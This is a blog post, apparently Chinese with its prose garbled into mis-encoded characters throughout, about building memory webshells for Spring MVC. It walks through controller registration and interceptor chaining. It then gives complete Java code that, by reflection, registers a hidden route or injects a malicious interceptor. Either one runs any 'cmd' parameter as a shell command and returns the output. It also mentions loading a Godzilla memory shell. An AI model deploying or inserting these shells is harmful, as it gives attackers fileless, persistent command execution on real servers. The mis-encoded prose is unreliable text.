---
layout: post
title: springÂÜÖÂ≠òÈ©¨
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

 

```java
Controller ÂÜÖÂ≠òÈ©¨
Interceptor Êã¶Êà™È©¨
‰ª•ÂèäÁªìÂêàÂì•ÊñØÊãâÈ©¨ÁöÑÂà©Áî®
```

## Âü∫Á°ÄÁü•ËØÜ

#### controller

```java
ControllerË¥üË¥£Â§ÑÁêÜDispatcherServlet ÂàÜÂèëÁöÑËØ∑Ê±ÇÔºåÂ∞ÜÁî®Êà∑ËØ∑Ê±ÇÂ§ÑÁêÜÂêéÂ∞ÅË£ÖÊàêmodelËøîÂõûÁªôview„ÄÇ
Âú®springmvcÁßçÁî®@ControllerÊ†áËÆ∞‰∏Ä‰∏™Á±ª‰∏∫Controller„ÄÇÁÑ∂ÂêéÁî®@RequestMappingÁ≠âÊù•ÂÆö‰πâURLËØ∑Ê±ÇÂíåControllerÊñπÊ≥ïÈó¥ÁöÑÊò†Â∞Ñ
   
```

### ControllerÁöÑÊ≥®ÂÜå

Âú®DoDispatchÂ§ÑÁî±DispatcherServletÂ§ÑÁêÜwebËØ∑Ê±Ç

![image-20231209141148259](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209141148259.png)

ÂæÄ‰∏äÊâæ‰∏Ä‰∏ãmappedHandlerÊòØ‰ªÄ‰πàÔºåÂæÄ‰∏äÁúãÔºåmappedHandlerÊòØÂØπhandlerMappingËøõË°åÈÅçÂéÜÔºå

![image-20231209142133699](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209142133699.png)

ÁªßÁª≠Ë∑üËøõgetHandler

![image-20231209142313760](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209142313760.png)

 ÁªßÁª≠Ë∑üËøõgetHandlerInternalÈáåÈù¢	

![image-20231209142413817](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209142413817.png)

![image-20231209142429247](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209142429247.png)

‰∏äÈù¢Â∞±ÊòØ‰∏Ä‰∏™Ë∞ÉÁî®ÊµÅÁ®ãÔºåÈáçË¶ÅÁöÑÊòØËøôÈáåÔºåmappingRegistryÂ≠òÂÇ®‰∫ÜË∑ØÁî±‰ø°ÊÅØ

![image-20231209142732550](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209142732550.png)

‰πüÂ∞±ÊòØËØ¥Ê®°ÊãüÊ≥®ÂÜåÂêëmappingRegistry‰∏≠Ê∑ªÂä†ÂÜÖÂ≠òÈ©¨Ë∑ØÁî±ÔºåÂ∞±ËÉΩÊ≥®ÂÖ•ÂÜÖÂ≠òÈ©¨„ÄÇ

Âú®AbstractHandlerMethodMapping‰∏≠Â∞±Êèê‰æõ‰∫ÜregistryMappingÊ∑ªÂä†Ë∑ØÁî±„ÄÇ‰ΩÜÊòØËØ•Á±ª‰∏∫ÊäΩË±°Á±ª„ÄÇÂÆÉÁöÑ Â≠êÁ±ªRequestMappingHandlerMappingËÉΩËøõË°åÂÆû‰æãÂåñ

![image-20231209143329384](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209143329384.png)

### RequestMappingHandlerMappingÂàÜÊûê

AbstractHandlerMethodMappingÁöÑafterPropertiesÁî®‰∫ébeanÂàùÂßãÂåñ

initHandlerMethod()ÈÅçÂéÜÊâÄÊúâbean‰º†ÂÖ•processCandidatebeanÂ§ÑÁêÜbeanÔºå‰πüÂ∞±ÊòØcontroller

![image-20231209143824641](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209143824641.png)

getTypeËé∑ÂèñbeanÁ±ªÂûãÔºåÈÄöËøáisHandlerËøõË°åÁ±ªÂûãÂà§Êñ≠ÔºåÂ¶ÇÊûúbeanÁ±ªÂûãÊòØcontrollerÊ¥ªÁùÄRequestMappingÊ≥®Ëß£ÔºåÂ∞±ËøõÂÖ•detectHandlerMethodsËß£Êûêbean

![image-20231209144112159](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209144112159.png)

Âú®deletectHandlerMethods‰∏≠ÔºåÁî®getMappingForMethodÂàõÂª∫RequestMappingInfo

![image-20231209144502783](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209144502783.png)

Â§ÑÁêÜÂÆåÂêéÁî®registryHandlerMethodÂª∫Á´ãÊñπÊ≥ïÂà∞RequestMappingInfoÁöÑÊò†Â∞ÑÔºå‰πüÂ∞±ÊòØÊ≥®ÂÜåË∑ØÁî±

![image-20231209144604915](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209144604915.png)

#### mappingRegistryË∑ØÁî±‰ø°ÊÅØ

registry‰º†ÂÖ•ÁöÑÂèÇÊï∞mapping,handler,method„ÄÇmappingÂ≠òÂÇ®‰∫ÜÊñπÊ≥ïÊò†Â∞ÑÁöÑURLË∑ØÂæÑ„ÄÇhandler‰∏∫controllerÂØπË±°„ÄÇmethod‰∏∫ÂèçÂ∞ÑËé∑ÂèñÁöÑÊñπÊ≥ï

## ControllerÂÜÖÂ≠òÈ©¨ÊûÑÈÄ†

### 1„ÄÅËé∑ÂèñWebApplicationContext

Âú®ÂÜÖÂ≠òÈ©¨ÊûÑÈÄ†‰∏≠ÔºåÈÉΩ‰ºöËé∑ÂèñÂÆπÂô®ÁöÑcontextÂØπË±°„ÄÇÂú®Tomcat‰∏≠Ëé∑ÂèñÁöÑÊòØStandardContextÔºåspring‰∏≠Ëé∑ÂèñÁöÑÊòØ`WebApplicationContext`„ÄÇÔºàÂú®controllerÁ±ªÂ£∞ÊòéÂ§ÑÊâì‰∏äÊñ≠ÁÇπÂèØ‰ª•ÁúãÂà∞ÂàùÂßãÂåñ`WebApplicationContext`ÁöÑËøáÁ®ã)WebApplicationContextÁªßÊâø‰∫ÜBeanFactory,ÊâÄ‰ª•ËÉΩÁî®getBeanÁõ¥Êé•Ëé∑ÂèñRequestMappingHandlerMappingÔºåËøõËÄåÊ≥®ÂÜåË∑ØÁî±„ÄÇ



ÊâÄ‰ª•ÈáçÁÇπÊòØÂ¶Ç‰ΩïËé∑ÂèñWebApplicationContext:

##### Ëé∑ÂèñWebApplicationContext:

Áî±‰∫éwebApplicationContextÂØπË±°Â≠òÊîæ‰∫éservletContext‰∏≠„ÄÇÂπ∂‰∏îÈîÆÂÄº‰∏∫

`WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE`

ÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•Áî®servletContext#getAttribute()Ëé∑ÂèñÂ±ûÊÄßÂÄº

```
WebApplicationContext wac = (WebApplicationContext)servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
```

webApplicationContextUtilsÊèê‰æõ‰∫Ü‰∏ãÈù¢‰∏§ÁßçÊñπÊ≥ïËé∑ÂèñwebApplicationContext„ÄÇÈúÄË¶Å‰º†ÂÖ•servletContext

```
WebApplicationContextUtils.getRequeiredWebApplicationContext(ServletContext s);
  WebApplicationContextUtils.getWebApplicationContext(ServletContext s);
```

> spring 5ÁöÑWebApplicationContextUtilsÂ∑≤ÁªèÊ≤°ÊúâgetWebApplicationContextÊñπÊ≥ï

- Ëé∑ÂèñServletContext

  ÈÄöËøárequestÂØπË±°ÊàñËÄÖContextLoaderËé∑ÂèñServletContext

  ```
  // 1
  ServletContext servletContext = request.getServletContext();
  // 2
  ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();
  ```

- Ëé∑ÂèñrequestÂèØ‰ª•Áî®RequestContextHolder

  ```
  HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder
          .getRequestAttributes()).getRequest();
  ```

spring‰∏≠Ëé∑ÂèñcontextÁöÑÊñπÂºè‰∏ÄËà¨Êúâ‰ª•‰∏ãÂá†Áßç

‚ë†Áõ¥Êé•ÈÄöËøáContextLoaderËé∑ÂèñÔºå‰∏çÁî®ÂÜçÁªèËøáservletContext„ÄÇ‰∏çËøáContextLoader‰∏ÄËà¨‰ºöË¢´ban

```
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

‚ë°ÈÄöËøáRequestContextHolderËé∑ÂèñrequestÔºåÁÑ∂ÂêéËé∑ÂèñservletRequestÂêéÈÄöËøáRequestContextUtilsÂæóÂà∞WebApplicationContext

```
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

‚ë¢Áî®RequestContextHolderÁõ¥Êé•‰ªéÈîÆÂÄºorg.springframework.web.servlet.DispatcherServlet.CONTEXT‰∏≠Ëé∑ÂèñContext

```
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

‚ë£Áõ¥Êé•ÂèçÂ∞ÑËé∑ÂèñWebApplicationContext

```
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
filed.setAccessible(true);
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

ÂÆûÈôÖ‰∏äÂ∏∏Áî®ÁöÑÂ∞±2,3„ÄÇ

ÂÖ∂‰∏≠1Ëé∑ÂèñÁöÑÊòØRoot WebApplicationContextÔºå2Ôºå3ÈÄöËøáRequestContextUtilsËé∑ÂèñÁöÑÊòØÂè´dispatcherServlet-servletÁöÑChild WebApplicationContext„ÄÇ

> Âú®Êúâ‰∫õSpring Â∫îÁî®ÈÄªËæëÊØîËæÉÁÆÄÂçïÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØËÉΩÊ≤°ÊúâÈÖçÁΩÆ `ContextLoaderListener` „ÄÅ‰πüÊ≤°ÊúâÁ±ª‰ºº `applicationContext.xml` ÁöÑÂÖ®Â±ÄÈÖçÁΩÆÊñá‰ª∂ÔºåÂè™ÊúâÁÆÄÂçïÁöÑ `servlet` ÈÖçÁΩÆÊñá‰ª∂ÔºåËøôÊó∂ÂÄôÈÄöËøá1ÊñπÊ≥ïÊòØËé∑Âèñ‰∏çÂà∞`Root WebApplicationContext`ÁöÑ„ÄÇ

![image-20231209151051697](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209151051697.png)

Ê≠§ÂÜÖÂ≠òÈ©¨ÈÄÇÂêà springboot<2.6ÁâàÊú¨

```java
package com.example.springboot12345.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class InjectController {
    @RequestMapping("/inject")
    public String inject() throws Exception{
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        Method method = InjectedController.class.getMethod("cmd");

        PatternsRequestCondition url = new PatternsRequestCondition("/evilcontroller");

        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();

        RequestMappingInfo info = new RequestMappingInfo(url, condition, null, null, null, null, null);

        InjectedController injectedController = new InjectedController();

        requestMappingHandlerMapping.registerMapping(info, injectedController, method);

        return "Inject done";
    }

    @RestController
    public class InjectedController {
        public InjectedController(){
        }
        public void cmd() throws Exception {
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            }
        }
    }
}
```

Ê≠§ÂÜÖÂ≠òÈ©¨ÈÉΩÂèØ‰ª•

```java
package com.example.springboot12345.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class Memshell {
    public Memshell(){}
    @RequestMapping("/Memshell")
    public String Memshell() throws Exception{
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =
                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = Memshell.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            Memshell springControllerMemShell = new Memshell();

            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);

        } catch (Exception hi) {
//            hi.printStackTrace();
        }

        return "success";
    }
    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }
}

```

## InterceptorÊã¶Êà™Âô®ÂÜÖÂ≠òÈ©¨ÊûÑÈÄ†

InterceptorÂíåTomcatÂíåFilterËøáÊª§Âô®ÂæàÁ±ª‰ºº„ÄÇÂå∫Âà´Â¶Ç‰∏ãÔºö

1. InterceptorÂü∫‰∫éÂèçÂ∞ÑÔºåFilterÂü∫‰∫éÂáΩÊï∞ÂõûË∞É
2. Interceptor‰∏ç‰æùËµñservletÂÆπÂô®
3. InterceptorÂè™ËÉΩÂØπactionËØ∑Ê±ÇÊúâÁî®
4. InterceptorÂèØ‰ª•ËÆøÈóÆaction‰∏ä‰∏ãÊñáÔºåÊ†àÈáåÁöÑÂØπË±°„ÄÇFilter‰∏çËÉΩ
5. actionÁîüÂëΩÂë®Êúü‰∏≠ÔºåInterceptorÂèØ‰ª•Ë¢´Â§öÊ¨°Ë∞ÉÁî®ÔºåFilterÂè™Âú®ÂÆπÂô®ÂàùÂßãÂåñÊó∂Ë∞ÉÁî®‰∏ÄÊ¨°
6. InterceptorÂèØ‰ª•Ëé∑ÂèñIOCÂÆπÂô®‰∏≠ÁöÑbeanÔºåFilter‰∏çË°å

Áî±‰ª•‰∏äÂå∫Âà´ÔºåInterceptorÁöÑÂ∫îÁî®ÂíåËøáÊª§Âô®‰πüÂ∞±‰∏çÂêåÔºåInterceptorÁî®Êù•ÂÅöÊó•ÂøóËÆ∞ÂΩïÔºåËøáÊª§Âô®Áî®Êù•ËøáÊª§ÈùûÊ≥ïÊìç‰Ωú

### Ê∫êÁ†ÅÂàÜÊûê

DispatcherServlet.doDispatch‰∏≠ÔºåËøõË°å‰∫ÜgetHandlerÔºåÊåÅÁª≠Ë∑üËøõÂèëÁé∞ÊúÄÁªàË∞ÉÁî®ÁöÑÊòØ

![image-20231209155415424](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209155415424.png)

![image-20231209155652212](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209155652212.png)

ËØ•ÊñπÊ≥ï‰ªéadaptedInterceptors‰∏≠ÊääÁ¨¶ÂêàÁöÑÊã¶Êà™Âô®Ê∑ªÂä†Âà∞chainÈáå„ÄÇ adaptedInterceptorsÂ∞±Â≠òÊîæ‰∫ÜÂÖ®ÈÉ®Êã¶Êà™Âô®

![image-20231209155702155](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209155702155.png)

ËøîÂõûÂà∞DispatcherServlet#doDispatch(),ÁÑ∂ÂêéÊâßË°å‰∫ÜapplyPreHandleÈÅçÂéÜÊâßË°å‰∫ÜÊã¶Êà™Âô®„ÄÇ

![image-20231209160024874](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209160024874.png)

ÂèØ‰ª•ÁúãÂà∞ÈáåÈù¢Â∞±ÊòØpreHandleÊñπÊ≥ïÔºåÂπ∂‰∏îÊã¶Êà™Âô®ÁöÑ‰∏ãÈù¢ÊâçÊòØÊàë‰ª¨ÁöÑÈÇ£‰∏Ä‰∏≤controller‰∏úË•øÔºåÊâÄ‰ª•ÊòØÂÖàÊâßË°åÊã¶Êà™Âô®ÁÑ∂ÂêéÊâßË°åcontroller

ÔºàD3CTFÈáåÈù¢ÔºåBooüë®‚Äçüéì‰πüÂ∞±ÊòØÂà©Áî®Ëøô‰∏™Êù•ÂÆåÊàêÁöÑÊ∏ÖÁ©∫ÂàóË°®ÈªëÂêçÂçïÔºâ

![image-20231209160033096](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209160033096.png)

![image-20231209160129104](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209160129104.png)

ÂÅ∑Âæó‰∏ÄÂº†Ë∞ÉÁî®ÊµÅÁ®ãÂõæÔºådofilter>Êã¶Êà™Âô®>controller

![image-20231209160422903](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209160422903.png)

- preHandle( )ÔºöËØ•ÊñπÊ≥ïÂú®ÊéßÂà∂Âô®ÁöÑÂ§ÑÁêÜËØ∑Ê±ÇÊñπÊ≥ïÂâçÊâßË°åÔºåÂÖ∂ËøîÂõûÂÄºË°®Á§∫ÊòØÂê¶‰∏≠Êñ≠ÂêéÁª≠Êìç‰ΩúÔºåËøîÂõû true Ë°®Á§∫ÁªßÁª≠Âêë‰∏ãÊâßË°åÔºåËøîÂõû false Ë°®Á§∫‰∏≠Êñ≠ÂêéÁª≠Êìç‰Ωú„ÄÇ
- postHandle( )ÔºöËØ•ÊñπÊ≥ïÂú®ÊéßÂà∂Âô®ÁöÑÂ§ÑÁêÜËØ∑Ê±ÇÊñπÊ≥ïË∞ÉÁî®‰πãÂêé„ÄÅËß£ÊûêËßÜÂõæ‰πãÂâçÊâßË°åÔºåÂèØ‰ª•ÈÄöËøáÊ≠§ÊñπÊ≥ïÂØπËØ∑Ê±ÇÂüü‰∏≠ÁöÑÊ®°ÂûãÂíåËßÜÂõæÂÅöËøõ‰∏ÄÊ≠•ÁöÑ‰øÆÊîπ„ÄÇ
- afterCompletion( )ÔºöËØ•ÊñπÊ≥ïÂú®ÊéßÂà∂Âô®ÁöÑÂ§ÑÁêÜËØ∑Ê±ÇÊñπÊ≥ïÊâßË°åÂÆåÊàêÂêéÊâßË°åÔºåÂç≥ËßÜÂõæÊ∏≤ÊüìÁªìÊùüÂêéÊâßË°åÔºåÂèØ‰ª•ÈÄöËøáÊ≠§ÊñπÊ≥ïÂÆûÁé∞‰∏Ä‰∫õËµÑÊ∫êÊ∏ÖÁêÜ„ÄÅËÆ∞ÂΩïÊó•Âøó‰ø°ÊÅØÁ≠âÂ∑•‰Ωú„ÄÇ

#### 1„ÄÅËé∑ÂèñRequestMappingHandlerMapping

Âú®AbstractHandlerMapping‰∏≠ËøõË°åÁöÑÊ∑ªÂä†Êã¶Êà™Âô®Ôºå‰ΩÜËøô‰∏™Á±ªÊòØÊäΩË±°Á±ªÔºåÂèØ‰ª•Ëé∑ÂèñÂÖ∂ÂÆûÁé∞Á±ªRequestMappingHandlerMapping,ÂíåÂâçÈù¢ÁöÑ‰∏ÄÊ†∑‰∫ÜÂ∞±

![image-20231209161404917](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209161404917.png)

```java
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
```

2„ÄÅÂèçÂ∞ÑËé∑ÂèñadaptedInterceptors

Ëé∑ÂèñadaptedInterceptorsÔºåÂèçÂ∞ÑËµãÂÄºÔºåÂπ∂‰∏î‰º†ÂÖ•RequestMappingHandlerMappingÂàùÂßãÂåñ

![image-20231209162412105](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209162412105.png)

```java
Field field = null;
    try {
        field = RequestMappingHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    field.setAccessible(true);
    List<HandlerInterceptor> adaptInterceptors = null;
    try {
        adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }
```

### 3.Ê∑ªÂä†ÊÅ∂ÊÑèInterceptors

```java
adaptInterceptors.add(new InjectEvilInterceptor("a"));
```

```java
package org.example.springmvc;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class InjectInterceptor implements HandlerInterceptor {
    static {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        InjectInterceptor evilInterceptor = new InjectInterceptor();
        adaptInterceptors.add(evilInterceptor);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getParameter("cmd") != null) {
            try{
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```

‰øÆÊîπ‰∏Ä‰∏ã

```java
package com.example.springboot12345.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;
@RestController
public class InjectInterceptor implements HandlerInterceptor {
   @RequestMapping("/aaa")
    public void aaa(){
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        InjectInterceptor evilInterceptor = new InjectInterceptor();
        adaptInterceptors.add(evilInterceptor);}


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getParameter("cmd") != null) {
            try{
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```

 ËÆøÈóÆ‰∫åÊ¨°ÊâçËÉΩÊâßË°åÔºàÂõ†‰∏∫Á¨¨‰∏ÄÊ¨°Êã¶Êà™Âô®ÊòØÊîæÂÖ•ÈáåÈù¢ÔºåÁ¨¨‰∫åÊ¨°Êâç‰ºöÊâßË°åÔºâ

![image-20231209163610787](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209163610787.png)

Á¨¨‰∏ÄÊ¨°ËÆøÈóÆ‰∏ç‰ºöÊâßË°åpreHandlerÔºåÁ¨¨‰∫åÊ¨°ËÆøÈóÆÊâç‰ºöÊâßË°å

![image-20231209165500361](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209165500361.png)

ÂèØ‰ª•ÂèëÁé∞

![image-20231209170431455](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209170431455.png)

![image-20231209170446434](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209170446434.png)

‰∏ãÈù¢ÊòØÂà§ÂÆöÊµÅÁ®ã

![image-20231209170633996](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209170633996.png)

![image-20231209170717802](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209170717802.png)



# Êé•‰∏ãÊù•ÊòØÈó≤ÁùÄÊó†ËÅäÔºåÂèàÊÉ≥ÊâìÈ©¨Êó∂Èó¥ÔºàÁ∫Ø2BÔºâ

ËøôÈáåÁõ¥Êé•Êêû‰∫Ü‰∏Ä‰∏™Ë∑ØÁî±ÔºåÁÑ∂ÂêéÂàùÂßãÂåñ‰∫Ü‰ª•ÂâçÊñáÁ´†ÂÜôÁöÑÂì•ÊñØÊãâÂÜÖÂ≠òÈ©¨ÔºåËÆøÈóÆÈ°µÈù¢ÂèëÁé∞Áõ¥Êé•ÊàêÂäü‰∫Ü

![image-20231209174050044](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209174050044.png)

